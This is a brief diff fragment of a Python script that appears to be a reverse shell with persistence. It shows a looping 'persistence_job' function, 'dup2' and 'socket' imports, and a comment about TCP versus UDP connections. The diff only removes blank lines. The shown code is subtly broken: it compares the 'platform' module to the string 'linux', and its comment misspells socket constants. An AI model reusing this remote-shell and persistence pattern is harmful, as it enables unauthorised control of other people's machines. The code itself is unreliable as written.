@@ -4,10 +4,8 @@ import os
 while True:
 
     def persistence_job():
-        
         import platform
         import time
-
         os.system('clear')
 
         if platform == "linux":
@@ -35,7 +33,6 @@ while True:
 
     from os import dup2
     import socket
-
     os.system('clear')
 
     # Change socket.SOCK_STREM(TCP) to socket.SOCK_DRAM for UDP connection
